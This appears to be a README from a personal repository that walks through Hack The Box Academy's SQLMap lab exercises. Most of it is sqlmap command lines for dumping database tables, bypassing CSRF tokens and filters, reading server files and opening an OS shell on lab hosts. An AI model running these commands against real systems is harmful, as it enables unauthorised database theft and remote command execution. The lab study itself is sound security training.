This repository contains my walkthrough and notes from the SQLMap Essentials module on Hack The Box Academy. The exercises and final assessment helped sharpen my skills in identifying and exploiting SQL Injection vulnerabilities using SQLMap.

## Module Exercises ##

## Case 1: Basic Dump ##
```bash 
sqlmap -r Case1.txt --threads 10 --dump -T flag1 -D testdb --dbms=MySQL --batch
```
## Case 2: Simple Request ##
```bash
sqlmap -r Case2.txt --threads 10 --dump -T flag2 --batch
```
## Case 3: Cookie-Based Injection ##
```bash 
sqlmap -r Case3.txt -p cookie --threads 10 --dump -T flag3 --batch
```
## Case 4: Simple Dump ##

sqlmap -r Case4.txt --threads 10 --dump -T flag4 --batch

## Case 5: Time-Based Blind SQLi ##

sqlmap -r Case5.txt --batch --dump -T flag5 -D testdb \
--no-cast --dbms=MySQL --technique=T --time-sec=10 --level=5 --risk=3 --fresh-queries

## Case 6: Using Prefix Payload ##

sqlmap -r Case6.txt --batch --dump -T flag6 -D testdb \
--no-cast --level=5 --risk=3 --prefix='`)'

## Case 7: Union-Based Injection ##

sqlmap -r Case7.txt --batch --dump -T flag7 -D testdb \
--no-cast --level=5 --risk=3 --union-cols=5 --dbms=MySQL

## Case 8: CSRF Token Handling ##

sqlmap -r case8.txt --batch -p "id" --csrf-token="t0ken" \
--dbms MySQL -D testdb -T flag8 --dump --flush-session --no-cast

## Case 9: Randomized Parameter ##

sqlmap -r Case9.txt -T flag9 --dump --risk=3 --level=5 --batch --randomize=uid

## Case 10: Random Agent ##

sqlmap -r case10.txt --batch -p "id" --random-agent \
--dbms MySQL -D testdb -T flag10 --dump --flush-session --no-cast

## Case 11: Tamper Script ##

sqlmap -r case11.txt --batch -p "id" --tamper=between \
--dbms MySQL -D testdb -T flag11 --dump --flush-session --no-cast

## File Reading & OS Shell ##

sqlmap -r read_file.txt --is-dba
sqlmap -r read_file.txt --file-read="/var/www/html/flag.txt"
cat ~/.local/share/sqlmap/output/94.237.58.172/files/_var_www_html_flag.txt

## OS Shell Access ##

sqlmap -u "http://94.237.58.172:59643?id=1" --os-shell --technique=E --batch
find / -type f -iname "*flag*" 2>/dev/null

## Skills Assessment: Minishop Web App ##

## Overview ##
### Application : Minishop
### Pages Analyzed: Blog, Contact Us, Catalog
### Findings
### Blog: Not vulnerable (form action is '#')
### Contact Us: Not vulnerable (form action is '#')
### Catalog (/shop): Vulnerable — uses JavaScript to post JSON to action.php

## Exploitation
### Intercepted request using Burp Suite
### Saved to shop.txt

## Exploited with SQLMap:

sqlmap -r shop.txt --batch -p 'id' --random-agent \
--tamper=between --dbms=MySQL -D production -T final_flag --dump

## Outcome

Successfully dumped final_flag table from the production database.

## Conclusion

**This module strengthened my understanding of:**

_SQL injection techniques (Boolean-based, Time-based, Union-based)
_
_Tamper scripts, CSRF tokens, and header injection_

_File read and OS shell interaction_

_Real-world application analysis and exploitation_

_I plan to continue my journey through the Hack The Box Pentester Pathway, with a focus on advanced web application testing, mobile app security, and red team tactics._

📁 Repository Structure

.
├── cases/
│   ├── Case1.txt
│   ├── Case2.txt
│   └── ...
├── shop.txt
├── read_file.txt
├── sqlmap_commands.md
└── README.md  <-- (this file)

Feel free to fork this repository and use it as a reference for your own HTB Academy progress!

## 📜 License

This project is licensed under the MIT License.

**MIT License**

Copyright (c) 2025 Manoj Ghimire

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

